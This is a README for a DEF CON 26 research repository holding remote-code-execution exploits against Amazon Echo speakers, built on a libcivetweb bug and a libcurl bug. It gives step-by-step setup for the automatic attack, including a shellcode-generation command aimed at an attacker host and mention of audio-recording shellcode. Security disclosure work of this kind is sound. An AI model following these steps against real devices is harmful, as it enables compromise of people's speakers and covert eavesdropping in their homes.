# [DEF CON 26] Breaking Smart Speaker - Exploit Amazon Echo

Shellcode, reports of Amazon Echo, which we have presented on Defcon26

This repository contains RCE exploit codes for the Amazon Echo devices.

These exploits are based on the libcivetweb RCE vulnerability (CVE-2018-12686), and the libcurl Information leak vulnerability (CVE-2017-1000254). For more details on Amazon Echo EXP, you may read the full slide that our speech at defcon26,  [available here](https://media.defcon.org/DEF%20CON%2026/DEF%20CON%2026%20presentations/Wu%20HuiYu%20and%20Qian%20Wenxiang/).

## Features ##

  * echo_leak: Contains the FTP server and the web server to trigger an information leak.
  * heap_exp: PoC code contains heap overflow and ROP.
  * whad_patch_privkey: Being used to obtain all whad certificates for client-authenticated TLS handshake on a root device (Since you can control the physically rooted device, you should turn off ASLR on it).
  * record_shellcode: Contains assembly code of shellcode for recording, which can be compiled using ndk.
  * tcpserver.py: If you are using the shellcode above, you can use this as server.

## Setup the PoC ##

1. Start an HTTP server, we will refer the IP address of this HTTP server as 'X'.
2. Please modify IP address in every files under **echo_leak\put under webserver** to X.
3. Then modify the IP address in a.php, b.php, test.pls.
4. Please modify the **CWD  = 'XXXXXXX'** in **echo_leak\ftpServer\ftp_server.py,** change this to the full folder name where ftp_server.py actually is. And change **every host1** to the address of Echo device(we will call this Y later), **hexurl** to X.
5. Please modify the IP address in **echo_leak\ftp_trigger.py**, where **host1** is Y, and **hexurl** to X.
6. Please modify the IP address in **heap_exp\expl.py**. Set **host1** to Y.
7. Please modify the IP address in **heap_exp\tcpserver.py**. Set **bind address** to X.
8. Please run **python genshellcode.py ADDRESS_OF_YOUR_HOST(X) PORT**, then copy the **shellcode.bin** to **echo_leak\ftpServer** for example: `python genshellcode.py 10.0.0.141 9999`
9. To adapt to different systems, you may adb pull the libc.so and libcrypto.so to heap_exp\, then run **python gengadgets.py** to generate the offset value of functions.
10. Modify the value in **conf.py**, ROP_CONFIG[‘gadgets’].
11. Run **python tcpserver.py** in **heap_exp** to start the server.
12. Run **sudo python start.py** in **echo_leak\ftpServer** to start the automatic attack.
13. Wait for the Echo device to connect, this could take up to 10~60minutes to connect. (The average time of one successful attack is about 30 minutes).

**PS: If you want to use the shellcode for recording, you may need to compile the code in the record_shellcode directory and fill the address of the function and the IP.**

## Contact us

If you've got any problems of our repository, please contact
blade@tencent.com. Ideas and solutions are always apperaciated!
